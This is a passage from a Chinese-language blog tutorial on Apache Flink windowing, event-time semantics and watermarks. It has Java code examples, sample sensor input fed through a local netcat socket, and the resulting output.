+ <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">getResult</span><span class="params">(Tuple2&lt;Double, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator.f0 / accumulator.f1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">merge</span><span class="params">(Tuple2&lt;Double, Integer&gt; a, Tuple2&lt;Double, Integer&gt; b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(a.f0 + b.f0, a.f1 + b.f1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动socket服务  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>本地socket输入，Flink控制台查看输出结果 </p><ul><li><p> 输入<br>这里为了方便，就只输入同一个keyBy组的数据<code>sensor_1</code>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,1</span><br><span class="line">sensor_1,1547718199,2</span><br><span class="line">sensor_1,1547718199,3</span><br><span class="line">sensor_1,1547718199,4</span><br><span class="line">sensor_1,1547718199,5</span><br><span class="line">sensor_1,1547718199,6</span><br><span class="line">sensor_1,1547718199,7</span><br><span class="line">sensor_1,1547718199,8</span><br><span class="line">sensor_1,1547718199,9</span><br><span class="line">sensor_1,1547718199,10</span><br><span class="line">sensor_1,1547718199,11</span><br><span class="line">sensor_1,1547718199,12</span><br><span class="line">sensor_1,1547718199,13</span><br><span class="line">sensor_1,1547718199,14</span><br></pre></td></tr></table></figure></li><li><p> 输出<br>输入时，会发现，每次到达一个窗口步长（这里为2），就会计算得出一次结果。<br>第一次计算前2个数的平均值<br>第二次计算前4个数的平均值<br>第三次计算前6个数的平均值<br>第四次计算前8个数的平均值<br>第五次计算前10个数的平均值</p></li></ul></li></ul><p><strong>第六次计算前最近10个数的平均值</strong><br><strong>第七次计算前最近10个数的平均值</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">result&gt; 1.5</span><br><span class="line">result&gt; 2.5</span><br><span class="line">result&gt; 3.5</span><br><span class="line">result&gt; 4.5</span><br><span class="line">result&gt; 5.5</span><br><span class="line">result&gt; 7.5</span><br><span class="line">result&gt; 9.5</span><br></pre></td></tr></table></figure><ol start="4"><li> 其他可选API代码片段  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3. 其他可选API</span></span><br><span class="line">OutputTag&lt;SensorReading&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SingleOutputStreamOperator&lt;SensorReading&gt; sumStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">  .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">  <span class="comment">//                .trigger() // 触发器，一般不使用 </span></span><br><span class="line">  <span class="comment">//                .evictor() // 移除器，一般不使用</span></span><br><span class="line">  .allowedLateness(Time.minutes(<span class="number">1</span>)) <span class="comment">// 允许1分钟内的迟到数据&lt;=比如数据产生时间在窗口范围内，但是要处理的时候已经超过窗口时间了</span></span><br><span class="line">  .sideOutputLateData(outputTag) <span class="comment">// 侧输出流，迟到超过1分钟的数据，收集于此</span></span><br><span class="line">  .sum(<span class="string">&quot;temperature&quot;</span>); <span class="comment">// 侧输出流 对 温度信息 求和。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 之后可以再用别的程序，把侧输出流的信息和前面窗口的信息聚合。（可以把侧输出流理解为用来批处理来补救处理超时数据）</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="时间语义和Watermark"><a href="#时间语义和Watermark" class="headerlink" title="时间语义和Watermark"></a>时间语义和Watermark</h3><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108374799">Flink_Window</a></p></blockquote><h4 id="Flink中的时间语义"><a href="#Flink中的时间语义" class="headerlink" title="Flink中的时间语义"></a>Flink中的时间语义</h4><p><img src="https://img-blog.csdnimg.cn/20200903145920356.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=E48vI&originHeight=337&originWidth=798&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> <strong>Event Time：事件创建时间；</strong> </li><li> Ingestion Time：数据进入Flink的时间； </li><li> Processing Time：执行操作算子的本地系统时间，与机器相关； </li></ul><pre><code>_Event Time是事件创建的时间。它通常由事件中的时间戳描述，例如采集的日志数据中，每一条日志都会记录自己的生成时间，Flink通过时间戳分配器访问事件时间戳。_</code></pre><hr><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106363815">Flink-时间语义与Wartmark及EventTime在Window中的使用</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200526200231905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=Lxnx1&originHeight=294&originWidth=673&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>不同的时间语义有不同的应用场合</li><li><strong>我们往往更关心事件事件（Event Time）</strong></li></ul><p><img src="https://img-blog.csdnimg.cn/20200526200432798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=We29M&originHeight=336&originWidth=559&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>这里假设玩游戏，两分钟内如果过5关就有奖励。用户坐地铁玩游戏，进入隧道前已经过3关，在隧道中又过了2关。但是信号不好，后两关通关的信息，等到出隧道的时候（8:23:20）才正式到达服务器。如果为了用户体验，那么应该按照Event Time处理信息，保证用户获得游戏奖励。</code></pre><ul><li> Event Time可以从日志数据的时间戳（timestamp）中提取  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2017-11-02 18:27:15.624 INFO Fail over to rm</span><br></pre></td></tr></table></figure></li></ul><h4 id="EventTime的引入"><a href="#EventTime的引入" class="headerlink" title="EventTime的引入"></a>EventTime的引入</h4><pre><code>**在Flink的流式处理中，绝大部分的业务都会使用eventTime**，一般只在eventTime无法使用时，才会被迫使用ProcessingTime或者IngestionTime。_（虽然默认环境里使用的就是ProcessingTime，使用EventTime需要另外设置）_如果要使用EventTime，那么需要引入EventTime的时间属性，引入方式如下所示：</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"><span class="comment">// 从调用时刻开始给env创建的每一个stream追加时间特征</span></span><br><span class="line">env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br></pre></td></tr></table></figure><p><strong>注：具体的时间，还需要从数据中提取时间戳。</strong></p><h4 id="Watermark"><a href="#Watermark" class="headerlink" title="Watermark"></a>Watermark</h4><blockquote><p><a href="https://blog.csdn.net/lmalds/article/details/52704170">Flink流计算编程–watermark（水位线）简介</a>    &lt;=    不错的文章，建议阅读</p></blockquote><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><ul><li><strong>Flink对于迟到数据有三层保障</strong>，先来后到的保障顺序是： <ul><li>WaterMark =&gt; 约等于放宽窗口标准</li><li>allowedLateness =&gt; 允许迟到（ProcessingTime超时，但是EventTime没超时）</li><li>sideOutputLateData =&gt; 超过迟到时间，另外捕获，之后可以自己批处理合并先前的数据</li></ul></li></ul><hr><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106363815">Flink-时间语义与Wartmark及EventTime在Window中的使用</a></p></blockquote><pre><code>我们知道，流处理从事件产生，到流经source，再到operator，中间是有一个过程和时间的，虽然大部分情况下，流到operator的数据都是按照事件产生的时间顺序来的，但是也不排除由于网络、分布式等原因，导致乱序的产生，所谓乱序，就是指Flink接收到的事件的先后顺序不是严格按照事件的Event Time顺序排列的。</code></pre><p><img src="https://img-blog.csdnimg.cn/20200526201305372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=xT718&originHeight=276&originWidth=435&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>那么此时出现一个问题，一旦出现乱序，如果只根据eventTime决定window的运行，我们不能明确数据是否全部到位，但又不能无限期的等下去，此时必须要有个机制来保证一个特定的时间后，必须触发window去进行计算了，这个特别的机制，就是Watermark。</code></pre><p><img src="https://img-blog.csdnimg.cn/20200526201418333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=UwrK6&originHeight=463&originWidth=1247&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 当Flink以<strong>Event Time模式</strong>处理数据流时，它会根据<strong>数据里的时间戳</strong>来处理基于时间的算子。<br>（比如5s一个窗口，那么理想情况下，遇到时间戳是5s的数据时，就认为[0,5s)时间段的桶bucket就可以关闭了。） </li><li> 实际由于网络、分布式传输处理等原因，会导致乱序数据的产生 </li><li> 乱序数据会导致窗口计算不准确<br>（如果按照前面说法，获取到5s时间戳的数据，但是2s，3s乱序数据还没到，理论上不应该关闭桶） </li></ul><hr><ul><li>怎样避免乱序数据带来的计算不正确？</li><li>遇到一个时间戳达到了窗口关闭时间，不应该立即触发窗口计算，而是等待一段时间，等迟到的数据来了再关闭窗口</li></ul><ol><li> Watermark是一种衡量Event Time进展的机制，可以设定延迟触发 </li><li> Watermark是用于处理乱序事件的，而正确的处理乱序事件，通常用Watermark机制结合window来实现 </li><li> 数据流中的Watermark用于表示”timestamp小于Watermark的数据，都已经到达了“，因此，window的执行也是由Watermark触发的。 </li><li> Watermark可以理解成一个延迟触发机制，我们可以设置Watermark的延时时长t，每次系统会校验已经到达的数据中最大的maxEventTime，然后认定eventTime小于maxEventTime - t的所有数据都已经到达，<strong>如果有窗口的停止时间等于maxEventTime – t，那么这个窗口被触发执行。</strong><br><code>Watermark = maxEventTime-延迟时间t</code> </li><li> watermark 用来让程序自己平衡延迟和结果正确性 </li></ol><p><em>watermark可以理解为把原本的窗口标准稍微放宽了一点。（比如原本5s，设置延迟时间=2s，那么实际等到7s的数据到达时，才认为是[0,5）的桶需要关闭了）</em></p><p>有序流的Watermarker如下图所示：（延迟时间设置为0s）</p><p><em>此时以5s一个窗口，那么EventTime=5s的元素到达时，关闭第一个窗口，下图即W(5)，W(10)同理。</em></p><p><img src="https://img-blog.csdnimg.cn/20200526201731274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=O7EfP&originHeight=227&originWidth=1409&originalType=binary&ratio=1&status=done&style=none"></p><p>乱序流的Watermarker如下图所示：（延迟时间设置为2s）</p><p><em>乱序流，所以可能出现EventTime前后顺序不一致的情况，这里延迟时间设置2s，第一个窗口则为</em><code>_5s+2s_</code><em>，当EventTime=7s的数据到达时，关闭第一个窗口。第二个窗口则是</em><code>_5*2+2=12s_</code><em>，当12s这个EventTime的数据到达时，关闭第二个窗口。</em></p><p><img src="https://img-blog.csdnimg.cn/2020052620175060.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=BZp8k&originHeight=219&originWidth=1268&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>当Flink接收到数据时，会按照一定的规则去生成Watermark，这条Watermark就等于当前所有到达数据中的maxEventTime-延迟时长，也就是说，**Watermark是基于数据携带的时间戳生成的**，一旦Watermark比当前未触发的窗口的停止时间要晚，那么就会触发相应窗口的执行。**由于event time是由数据携带的，因此，如果运行过程中无法获取新的数据，那么没有被触发的窗口将永远都不被触发**。上图中，我们设置的允许最大延迟到达时间为2s，所以时间戳为7s的事件对应的Watermark是5s，时间戳为12s的事件的Watermark是10s，如果我们的窗口1是`1s~5s`，窗口2是`6s~10s`，那么时间戳为7s的事件到达时的Watermarker恰好触发窗口1，时间戳为12s的事件到达时的Watermark恰好触发窗口2。**Watermark 就是触发前一窗口的“关窗时间”，一旦触发关门那么以当前时刻为准在窗口范围内的所有所有数据都会收入窗中。****只要没有达到水位那么不管现实中的时间推进了多久都不会触发关窗。**</code></pre><h5 id="Watermark的特点"><a href="#Watermark的特点" class="headerlink" title="Watermark的特点"></a>Watermark的特点</h5><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106363815">Flink-时间语义与Wartmark及EventTime在Window中的使用</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200526204111817.png###id=QdWNb&originHeight=164&originWidth=674&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> watermark 是一条特殊的数据记录 </li><li> <strong>watermark 必须单调递增</strong>，以确保任务的事件时间时钟在向前推进，而不是在后退 </li><li> watermark 与数据的时间戳相关 </li></ul><h5 id="Watermark的传递"><a href="#Watermark的传递" class="headerlink" title="Watermark的传递"></a>Watermark的传递</h5><p><img src="https://img-blog.csdnimg.cn/20200526204125805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=wXLnd&originHeight=387&originWidth=673&originalType=binary&ratio=1&status=done&style=none"></p><ol><li>图一，当前Task有四个上游Task给自己传输WaterMark信息，通过比较，只取当前最小值作为自己的本地Event-time clock，上图中，当前Task[0,2)的桶就可关闭了，因为所有上游中2s最小，能保证2s的WaterMark是准确的（所有上游Watermark都已经&gt;=2s)。这时候将Watermark=2广播到当前Task的下游。</li><li>图二，上游的Watermark持续变动，此时Watermark=3成为新的最小值，更新本地Task的event-time clock，同时将最新的Watermark=3广播到下游</li><li>图三，上游的Watermark虽然更新了，但是当前最小值还是3，所以不更新event-time clock，也不需要广播到下游</li><li>图四，和图二同理，更新本地event-time clock，同时向下游广播最新的Watermark=4</li></ol><h5 id="Watermark的引入"><a href="#Watermark的引入" class="headerlink" title="Watermark的引入"></a>Watermark的引入</h5><pre><code>watermark的引入很简单，对于乱序数据，最常见的引用方式如下：</code></pre><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dataStream.assignTimestampsAndWatermarks( <span class="keyword">new</span> <span class="type">BoundedOutOfOrdernessTimestampExtractor</span>&lt;<span class="type">SensorReading</span>&gt;(<span class="type">Time</span>.milliseconds(<span class="number">1000</span>)) &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  public long extractTimestamp(element: <span class="type">SensorReading</span>): <span class="type">Long</span> = &#123; </span><br><span class="line">    <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000</span>L;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><pre><code>**Event Time的使用一定要指定数据源中的时间戳。否则程序无法知道事件的事件时间是什么(数据源里的数据没有时间戳的话，就只能使用Processing Time了)**。我们看到上面的例子中创建了一个看起来有点复杂的类，这个类实现的其实就是分配时间戳的接口。Flink暴露了TimestampAssigner接口供我们实现，使我们可以自定义如何从事件数据中抽取时间戳。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"><span class="comment">// 设置事件时间语义 env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span></span><br><span class="line">DataStream&lt;SensorReading&gt; dataStream = env.addSource(<span class="keyword">new</span> SensorSource()) .assignTimestampsAndWatermarks(<span class="keyword">new</span> MyAssigner());</span><br></pre></td></tr></table></figure><p>MyAssigner有两种类型</p><ul><li> AssignerWithPeriodicWatermarks </li><li> AssignerWithPunctuatedWatermarks </li></ul><p>以上两个接口都继承自TimestampAssigner。</p><h6 id="TimestampAssigner"><a href="#TimestampAssigner" class="headerlink" title="TimestampAssigner"></a>TimestampAssigner</h6><p>####### AssignerWithPeriodicWatermarks</p><ul><li> 周期性的生成 watermark：系统会周期性的将 watermark 插入到流中 </li><li> 默认周期是200毫秒，可以使用 <code>ExecutionConfig.setAutoWatermarkInterval()</code> 方法进行设置 </li><li> <strong>升序和前面乱序的处理 BoundedOutOfOrderness ，都是基于周期性 watermark 的</strong>。 </li></ul><p>####### AssignerWithPunctuatedWatermarks</p><ul><li>没有时间周期规律，可打断的生成 watermark（即可实现每次获取数据都更新watermark）</li></ul><h5 id="Watermark的设定"><a href="#Watermark的设定" class="headerlink" title="Watermark的设定"></a>Watermark的设定</h5><ul><li>在Flink中，Watermark由应用程序开发人员生成，这通常需要对相应的领域有一定的了解</li><li>如果Watermark设置的延迟太久，收到结果的速度可能就会很慢，解决办法是在水位线到达之前输出一个近似结果</li><li>如果Watermark到达得太早，则可能收到错误结果，不过Flink处理迟到数据的机制可以解决这个问题</li></ul><pre><code>_一般大数据场景都是考虑高并发情况，所以一般使用周期性生成Watermark的方式，避免频繁地生成Watermark。_</code></pre><hr><p><strong>注：一般认为Watermark的设置代码，在里Source步骤越近的地方越合适。</strong></p><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><p>测试Watermark和迟到数据</p><p>java代码（旧版Flink），新版的代码我暂时不打算折腾，之后用上再说吧。</p><p><strong>这里设置的Watermark的延时时间是2s，实际一般设置和window大小一致。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest3_EventTimeWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Flink1.12.X 已经默认就是使用EventTime了，所以不需要这行代码</span></span><br><span class="line">    <span class="comment">//        env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span></span><br><span class="line">    env.getConfig().setAutoWatermarkInterval(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket文本流</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型，分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      <span class="comment">//              </span></span><br><span class="line">      <span class="comment">//                // 旧版 (新版官方推荐用assignTimestampsAndWatermarks(WatermarkStrategy) )</span></span><br><span class="line">      <span class="comment">// 升序数据设置事件时间和watermark</span></span><br><span class="line">      <span class="comment">//.assignTimestampsAndWatermarks(new AscendingTimestampExtractor&lt;SensorReading&gt;() &#123;</span></span><br><span class="line">      <span class="comment">//  @Override</span></span><br><span class="line">      <span class="comment">//  public long extractAscendingTimestamp(SensorReading element) &#123;</span></span><br><span class="line">      <span class="comment">//    return element.getTimestamp() * 1000L;</span></span><br><span class="line">      <span class="comment">//  &#125;</span></span><br><span class="line">      <span class="comment">//&#125;)</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 旧版 (新版官方推荐用assignTimestampsAndWatermarks(WatermarkStrategy) )</span></span><br><span class="line">      <span class="comment">// 乱序数据设置时间戳和watermark</span></span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    OutputTag&lt;SensorReading&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于事件时间的开窗聚合，统计15秒内温度的最小值</span></span><br><span class="line">    SingleOutputStreamOperator&lt;SensorReading&gt; minTempStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(outputTag)</span><br><span class="line">      .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    minTempStream.print(<span class="string">&quot;minTemp&quot;</span>);</span><br><span class="line">    minTempStream.getSideOutput(outputTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="并行任务Watermark传递测试"><a href="#并行任务Watermark传递测试" class="headerlink" title="并行任务Watermark传递测试"></a>并行任务Watermark传递测试</h6><p>在前面代码的基础上，修改执行环境并行度为4，进行测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowTest3_EventTimeWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">    env.setParallelism(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line">    env.getConfig().setAutoWatermarkInterval(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket文本流</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转换成SensorReading类型，分配时间戳和watermark</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 乱序数据设置时间戳和watermark</span></span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    OutputTag&lt;SensorReading&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;SensorReading&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 基于事件时间的开窗聚合，统计15秒内温度的最小值</span></span><br><span class="line">    SingleOutputStreamOperator&lt;SensorReading&gt; minTempStream = dataStream.keyBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(outputTag)</span><br><span class="line">      .minBy(<span class="string">&quot;temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    minTempStream.print(<span class="string">&quot;minTemp&quot;</span>);</span><br><span class="line">    minTempStream.getSideOutput(outputTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动本地socket，输入数据，查看结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure><p>输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 